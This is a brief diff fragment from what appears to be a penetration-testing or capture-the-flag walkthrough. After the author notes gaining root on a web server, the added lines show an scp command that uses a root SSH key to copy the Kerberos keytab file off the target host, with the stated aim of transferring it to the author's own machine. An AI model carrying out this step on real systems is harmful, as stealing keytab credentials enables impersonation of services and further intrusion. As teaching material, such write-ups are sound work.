@@ -720,3 +720,10 @@ root@web-01:~#
 
 I am now root
 
+```python
+scp -i root_id_rsa root@ctos.site:/etc/krb5.keytab .  
+krb5.keytab    
+```
+
+Ill grab the keytab file and transfer to my machine
+
